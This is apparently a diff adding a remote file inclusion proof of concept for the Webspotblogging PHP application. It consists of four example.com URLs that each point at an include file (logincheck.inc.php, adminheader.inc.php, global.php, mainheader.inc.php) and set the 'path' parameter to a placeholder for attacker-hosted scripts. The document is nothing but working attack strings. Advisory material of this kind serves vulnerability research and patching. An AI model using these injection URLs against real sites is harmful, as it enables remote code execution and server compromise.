@@ -1,0 +1,4 @@
+http://www.example.com/[Webspotblogging_path]/inc/logincheck.inc.php?path=[evil_scripts]
+http://www.example.com/[Webspotblogging_path]/inc/adminheader.inc.php?path=[evil_scripts]
+http://www.example.com/[Webspotblogging_path]/inc/global.php?path=[evil_scripts]
+http://www.example.com/[Webspotblogging_path]/inc/mainheader.inc.php?path=[evil_scripts]
